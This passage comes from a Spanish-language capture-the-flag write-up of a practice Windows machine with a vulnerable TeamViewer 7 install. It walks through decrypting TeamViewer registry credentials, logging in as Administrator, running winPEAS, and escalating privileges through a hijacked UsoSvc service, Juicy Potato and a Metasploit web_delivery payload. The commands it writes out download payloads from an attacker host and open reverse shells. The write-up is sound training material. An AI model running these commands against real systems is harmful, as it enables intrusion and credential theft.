Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.180 - - [26/Mar/2023 20:15:53] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
127.0.0.1 - - [26/Mar/2023 22:05:25] "GET / HTTP/1.1" 200 -
```
Bien ya estamos dentro, ahora es cosa de buscar la flag del usuario y listo.

## Post Explotación {#Post}

### Explotando Servicio TeamViewer {#exploit1}

Bien, es hora de buscar que hay en la máquina. Investigamos en varios lados, pero hay algo interesante en el directorio **Program Files (x86)** y es el servicio **TeamViewer**, pero ¿qué es esto?

| **TeamViewer** |
|:-----------:|
| *TeamViewer es un software para el acceso remoto, así como para el control y el soporte en remoto de ordenadores y otros dispositivos finales.* |

Si entramos en ese directorio, nos dirá la versión que esta instalada de **TeamViewer**:
```batch
PS C:\Program Files (x86)> cd TeamViewer 
PS C:\Program Files (x86)\TeamViewer> dir

    Directory: C:\Program Files (x86)\TeamViewer

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/27/2020  10:35 AM                Version7
```

Resulta, que esta versión de **TeamViewer**, tiene una vulnerabilidad que permite ejecutar comandos de manera remota si se esta autenticado.

Busquemos un Exploit:
```bash
searchsploit TeamViewer version7                                                                               
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

No pues nada, busquemos el servicio nada más:
```bash
searchsploit TeamViewer         
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path

|---|---|
TeamViewer 11 < 13 (Windows 10 x86) - Inline Hooking / Direct Memory Modification Permission Change        | windows_x86/local/43366.md
TeamViewer 11.0.65452 (x64) - Local Credentials Disclosure                                                 | windows_x86-64/local/40342.py
TeamViewer 5.0.8232 - Remote Buffer Overflow                                                               | windows/remote/34002.c
TeamViewer 5.0.8703 - 'dwmapi.dll' DLL Hijacking                                                           | windows/local/14734.c
TeamViewer App 13.0.100.0 - Denial of Service (PoC)                                                        | windows_x86-64/dos/45404.py

|---|---|
Shellcodes: No Results
Papers: No Results
```
No creo que nos sirvan estos Exploits, mejor vamos a buscar por internet.

Encontré el siguiente link con datos de interés:
* <a href="https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat" target="_blank">Repositorio de ms-r3b00t: CVE-2019-18988</a>

En este link hay varias pruebas que podemos hacer dentro de la máquina para obtener las **credenciales de Windows**:
```bash
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
```

Una vez usemos este comando, nos dará información muy útil que sera las credenciales, pero encriptadas:
```bash
LastUpdateCheck    REG_DWORD    0x6250227f
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3
```

Lo que necesitamos es desencriptar dichas credenciales, aunque la que más nos interesa es la de **SecurityPasswordAES**. Para desencriptarlas, vamos a usar un script en **Python** que creo el usuario del siguiente link:
* <a href="https://whynotsecurity.com/blog/teamviewer/" target="_blank">WhyNotSecurity - TeamViewer</a>

Con leer el blog, vemos la aventura que se echó para descubrir como explotar las vulnerabilidades que se encontraron en el **TeamViewer Versión 7** y el cómo le haría para desencriptar dichas credenciales, incluso el siguiente link también explica todo esto pero ya resumido: 
* <a href="https://kalilinuxtutorials.com/decryptteamviewer/" target="_blank">DecryptTeamViewer: Enumerate & Decrypt TeamViewer Credentials From Windows Registry</a>

Pero nosotros, vamos a ocupar esta versión: 
<a href="https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0" target="_blank">Repositorio de rishdang: teamviewer_password_decrypt.py</a>

Para usarlo es solo copiar el código en un archivo **.py** y tener instaladas los siguientes módulos de **Python**:
* *hexdump*
* *pycryptodome*

PERO, antes de instalar algo, analice un poco el script y no se para que usa **hexdump** así que lo quite y sirvió el script.

Para instalar el **pycryptomode** hacemos lo siguiente:
```bash
pip3 install pycryptodome    
Collecting pycryptodome
  Downloading pycryptodome-3.17-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 MB 8.5 MB/s eta 0:00:00
Installing collected packages: pycryptodome
Successfully installed pycryptodome-3.17
```

Y ahora si ya podemos usar el Exploit y con solo activar el script, ya solo es pasarle el encriptado de **SecurityPasswordAES**:
```bash
python3 TeamViewer_Exploit.py

This is a quick and dirty Teamviewer password decrypter basis wonderful post by @whynotsecurity.
Read this blogpost if you haven't already : https://whynotsecurity.com/blog/teamviewer
 
Please check below mentioned registry values and enter its value manually without spaces.
"SecurityPasswordAES" OR "OptionsPasswordAES" OR "SecurityPasswordExported" OR "PermanentPassword"

Enter output from registry without spaces : FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
Decrypted password is :  !R3m0te!
```

Muy bien, ya tenemos la contraseña, es momento de checar si la clave función. Para esto, vamos a usar **Crackmapexec**:
```bash
crackmapexec smb 10.10.10.180 -u 'Administrator' -p '!R3m0te!'
SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
SMB         10.10.10.180    445    REMOTE           [+] remote\Administrator:!R3m0te! (Pwn3d!)
```

Y si funciona, vamos a conectarnos remotamente con la herramienta **Evil Winrm**:
```batch
evil-winrm -i 10.10.10.180 -u 'Administrator' -p '!R3m0te!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
remote\administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/26/2023   5:50 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```
Y ya, con esto obtenemos ambas flags y terminamos con esta máquina.

### Utilizando winPEAS para Encontrar Vulnerabilidades {#exploit2}

Vamos a cargar la super herramienta **winPEAS**, para que nos muestre si hay alguna manera de escalar privilegios. 

Primero, ve al siguiente link y descarga la **versión 64x**:
* <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240324-2c3cd766" target="_blank">Repositorio de carlospolop: PEAS-ng - releases</a>

Una vez que lo tengas descargado, abre un servidor web con **Python** y descargalo en la máquina víctima, ya sea, usando **certutil o iwk**:

* Abriendo el servidor en **Python**:
```bash
python -m http.server 80
```

* Descargando **winPEAS** con **certutil**:
```batch
certutil -urlcache -f http://Tu_IP/winPEASx64.exe winPeas.exe
```

* Descargando **winPEAS** con **iwr**:
```batch
iwr http://Tu_IP:80/winPEASx64.exe -OutFile winPeas.exe
```

Comprobamos que se haya descargado:
```batch
PS C:\Users\Public\Desktop> dir

    Directory: C:\Users\Public\Desktop

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/20/2020   2:14 AM           1191 TeamViewer 7.lnk                                                      
-ar---        x/xx/xxxx   2:11 PM             34 user.txt                                                              
-a----        x/xx/xxxx  10:25 PM        2387456 winPeas.exe                                                           
```

Y lo ejecutamos:
```batch
winPeas.exe
winPeas.exe
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((                                                                                                                                                                                            
        (((((((((((((((((((((((((((((((((((((((((((                                                                                                                                                                                        
      ((((((((((((((**********/##########(((((((((((((                                                                                                                                                                                     
    ((((((((((((********************/#######(((((((((((                                                                                                                                                                                    
    ((((((((******************/@@@@@/****######((((((((((                                                                                                                                                                                  
    ((((((********************@@@@@@@@@@/***,####((((((((((                                                                                                                                                                                
    (((((********************/@@@@@%@@@@/********##(((((((((                                                                                                                                                                               
    (((############*********/%@@@@@@@@@/************((((((((                                                                                                                                                                               
    ((##################(/******/@@@@@/***************((((((                                                                                                                                                                               
    ((#########################(/**********************(((((                                                                                                                                                                               
    ((##############################(/*****************(((((                                                                                                                                                                               
    ((###################################(/************(((((                                                                                                                                                                               
    ((#######################################(*********(((((                                                                                                                                                                               
    ((#######(,.***.,(###################(..***.*******(((((                                                                                                                                                                               
    ((#######*(#####((##################((######/(*****(((((                                                                                                                                                                               
    ((###################(/***********(##############()(((((                                                                                                                                                                               
    (((#####################/*******(################)((((((                                                                                                                                                                               
    ((((############################################)((((((                                                                                                                                                                                
    (((((##########################################)(((((((                                                                                                                                                                                
    ((((((########################################)(((((((                                                                                                                                                                                 
    ((((((((####################################)((((((((                                                                                                                                                                                  
    (((((((((#################################)(((((((((                                                                                                                                                                                   
        ((((((((((##########################)(((((((((                                                                                                                                                                                     
              ((((((((((((((((((((((((((((((((((((((                                                                                                                                                                                       
                 ((((((((((((((((((((((((((((((                                                                                                                                                                                            

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                                                                                                                                                                                     
                                                                                                                                                                                                                                           
  WinPEAS-ng by @hacktricks_live
```

Observa las siguientes vulnerabilidades que vamos a explotar:
```batch
[?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)
 [*] OS Version: 1809 (17763)
 [*] Enumerating installed KBs...
 [!] CVE-2019-0836 : VULNERABLE
  [>] https://exploit-db.com/exploits/46718
  [>] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/

 [!] CVE-2019-0841 : VULNERABLE
  [>] https://github.com/rogue-kdc/CVE-2019-0841
  [>] https://rastamouse.me/tags/cve-2019-0841/

 [!] CVE-2019-1064 : VULNERABLE
  [>] https://www.rythmstick.net/posts/cve-2019-1064/

 [!] CVE-2019-1130 : VULNERABLE
  [>] https://github.com/S3cur3Th1sSh1t/SharpByeBear

 [!] CVE-2019-1253 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2019-1253
  [>] https://github.com/sgabe/CVE-2019-1253

 [!] CVE-2019-1315 : VULNERABLE
  [>] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html

 [!] CVE-2019-1385 : VULNERABLE
  [>] https://www.youtube.com/watch?v=K6gHnr-VkAg

 [!] CVE-2019-1388 : VULNERABLE
  [>] https://github.com/jas502n/CVE-2019-1388

 [!] CVE-2019-1405 : VULNERABLE
  [>] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/
  [>] https://github.com/apt69/COMahawk

 [!] CVE-2020-0668 : VULNERABLE
  [>] https://github.com/itm4n/SysTracingPoc

 [!] CVE-2020-0683 : VULNERABLE
  [>] https://github.com/padovah4ck/CVE-2020-0683
  [>] https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/cve-2020-0683.ps1

 [!] CVE-2020-1013 : VULNERABLE
  [>] https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/

 [*] Finished. Found 12 potential vulnerabilities.

����������͹ Modifiable Services
� Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    UsoSvc: AllAccess, Start
.
```
Con esto sabido, puedes probar algunos de los Exploits que nos menciona. Obviamente, debes leer primero si estos son compatibles para su uso en esta máquina.

Vamos a probar 3 formas de explotar la máquina:
* Modificando el **servicio UsoSvc**.
* Utilizando **Juicy Potato**.
* Descubriendo la contraseña de **TeamViewer** usando modulo de **Metasploit Framework**.

### Modificando Servicio UsoSvc {#exploit3}

Para realizar este proceso, necesitamos una **Reverse Shell** para conectarnos en otra terminal y necesitamos modificar el **servicio UsoSvc**, de tal forma que al activar este servicio, ejecute un comando como Administrador para conectarnos como administrador.

Pero, ¿qué es el **servicio UsoSvc**?

| **UsoSvc** |
|:-----------:|
| *El servicio Update Orchestrator controla la descarga, instalación y verificación de las actualizaciones de Windows para computadoras. En cualquier caso, si desea seguir recibiendo e instalando actualizaciones, debe mantener el servicio en funcionamiento. El servicio se ejecuta bajo el proceso compartido svchost.exe, que básicamente inicia muchos procesos, y Update Orchestrator Service es uno de estos procesos.* |

La siguiente página nos dice como modificar el **servicio UsoSvc**:
* <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services" target="_blank">HackTricks: Windows Local Privilege Escalation - Services</a>

Vamonos por pasos:

* Creando **Reverse Shell**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=1337 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
```

* Abre un servidor con **Python**:
```bash
python3 -m http.server 80
```

* Cargando **Reverse Shell** en la máquina víctima:
```bash
C:\Users\Public\Desktop>certutil -urlcache -f http://Tu_IP/shell.exe shell.exe
certutil -urlcache -f http://Tu_IP/shell.exe shell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

* Modificando **servicio UsoSvc**:
```batch
C:\Users\Public\Desktop>sc.exe stop UsoSvc
.
C:\Users\Public\Desktop>sc.exe config UsoSvc binpath="C:\Users\Public\Desktop\shell.exe"
```

* Iniciando otra **netcat**:
```bash
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
```

* Iniciando **servicio UsoSvc**:
```batch
C:\Users\Public\Desktop>sc.exe start UsoSvc
sc.exe start UsoSvc
[SC] StartService FAILED 1053:
.
The service did not respond to the start or control request in a timely fashion.
```

* Obtenemos la sesión como administrador:
```batch
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.180] 49900
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
.
C:\Windows\system32>whoami
whoami
nt authority\system
```

### Explotando Máquina con Juicy Potato {#exploit4}

Para este, necesitamos utilizar una **Reverse Shell** y tener descargado el **Juicy Potato**. 

Para descargarlo, utiliza el siguiente link:
* <a href="https://github.com/ohpe/juicy-potato/releases" target="_blank">Repositorio de ohpe: Juicy Potato - releases</a>

Y necesitamos tener un **CLSID**, para este caso, podemos utilizar el **CLSID** que tiene el **servicio UsoSvc**. Prueba si no es necesario modificar el **UsoSvc** antes de usar el **Juicy Potato**, no deberías tener problemas, pero si es el caso, modificalo como en la forma anterior. El **CLSID** lo podemos obtener desde una página del mismo repositorio de **GitHub**.

Ahora, podemos utilizar la misma **Reverse Shell** que ya hicimos, entonces, carguemos el **Juicy Potato** en la máquina víctima y ejecutemoslo:

* Abre un servidor con **Python** donde tengas el **Juicy Potato**:
```bash
python3 -m http.server 80
```

* Cargando **Juicy Potato** a la máquina víctima:
```batch
certutil.exe -urlcache -split -f http://Tu_IP/JuicyPotato.exe JuicyP.exe           
certutil.exe -urlcache -split -f http://Tu_IP/JuicyPotato.exe JuicyP.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
```

* Iniciando otra **netcat**:
```bash
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
```

* Ejecutando **Juicy Potato**:
```batch
C:\Users\Public\Desktop>JuicyP.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Users\Public\Desktop\shell.exe -e cmd Tu_IP 1337" -c {B91D5831-B1BD-4608-8198-D72E155020F7}
JuicyP.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Users\Public\Desktop\shell.exe -e cmd Tu_IP 1337" -c {B91D5831-B1BD-4608-8198-D72E155020F7}
Testing {B91D5831-B1BD-4608-8198-D72E155020F7} 1337
COM -> recv failed with error: 10038
```

* Obtenemos la sesión como administrador:
```batch
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.180] 49900
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
. 
C:\Windows\system32>whoami
whoami
nt authority\system
```

### Utilizando Módulo de Metasploit para Obtener Contraseñas de Administrador {#exploit5}

Por último, vamos a crear una sesión en **meterpreter**, utilizando el **Metasploit Framework** para que podamos usar el modulo contra el **TeamViewer**.

Vamos a crear primero la sesión, por pasos:

* Abriendo **Metasploit Framework** y usando el **modulo web_delivery**
```bash
msfconsole
.
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) >
```

* Observando opciones a configurar:
```bash
msf6 exploit(multi/script/web_delivery) > show options
.
Module options (exploit/multi/script/web_delivery):
.
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
.
Payload options (python/meterpreter/reverse_tcp):
.
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
.
Exploit target:

   Id  Name
   --  ----
   0   Python
```

* Aplicando Configuraciones:
```bash
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST Tu_IP
LHOST => Tu_IP
msf6 exploit(multi/script/web_delivery) > set SRVHOST Tu_IP
SRVHOST => Tu_IP
```

* Ejecutando modulo:
```bash
msf6 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
.
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Using URL: http://Tu_IP:8080/lCUF1ttGN
[*] Server started.
[*] Run the following command on the target machine:
msf6 exploit(multi/script/web_delivery) > powershell.exe -nop -w hidden -e WwBOAGUA...
```

* Ejecutando payload en máquina víctima:
```bash
PS C:\windows\system32\inetsrv>powershell.exe -nop -w hidden -e WwBOAGUAdAAuA...
```

* Obteniendo sesión de **meterpreter**:
```bash
[*] 10.10.10.180     web_delivery - Delivering AMSI Bypass (1414 bytes)
[*] 10.10.10.180     web_delivery - Delivering Payload (3696 bytes)
[*] Sending stage (200774 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 10.10.10.180:49823) at 2023-03-26 20:47:31 -0600
.
msf6 exploit(multi/script/web_delivery) > sessions
.
Active sessions
===============
.
  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x64/windows  IIS APPPOOL\DefaultAppPool @ REMOTE  Tu_IP:4444 -> 10.10.10.180:49823 (10.10.10.180)
```

Excelente, ahora, busquemos un Exploit para el **TeamVIewer**, lo cargamos para usarlo en la sesión actual y lo ejecutamos:

* Buscando Exploit, usamos el módulo que obtiene las contraseñas del **TeamViewer**:

```bash
msf6 exploit(multi/script/web_delivery) > search teamviewer
Matching Modules
================
   #  Name                                                  Disclosure Date  Rank    Check  Description
   -  ----                                                  ---------------  ----    -----  -----------
   0  auxiliary/server/teamviewer_uri_smb_redirect                           normal  No     TeamViewer Unquoted URI Handler SMB Redirect
   1  post/windows/gather/credentials/teamviewer_passwords                   normal  No     Windows Gather TeamViewer Passwords
```

* Cargando Exploit:
```bash
msf6 exploit(multi/script/web_delivery) > use post/windows/gather/credentials/teamviewer_passwords
msf6 post(windows/gather/credentials/teamviewer_passwords) > show options
*
Module options (post/windows/gather/credentials/teamviewer_passwords):
   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   SESSION                        yes       The session to run this module on
   WINDOW_TITLE  TeamViewer       no        Specify a title for getting the window handle, e.g. TeamViewer
```

* Ejecutando Exploit:
```bash
msf6 post(windows/gather/credentials/teamviewer_passwords) > set sessions 1
msf6 post(windows/gather/credentials/teamviewer_passwords) > exploit
.
[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
[+] Passwords stored in: /root/.msf4/loot/20240326213319_default_10.10.10.180_host.teamviewer__831643.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are ''
[*] TeamViewer's version is ''
[-] Unable to find TeamViewer's process
[*] Post module execution completed
```

De esta forma, obtuvimos la contraseña que necesitamos para poder conectarnos a la máquina víctima como **administrador**, que fue lo mismo que hicimos al principio para obtener la contraseña del **TeamViewer**.
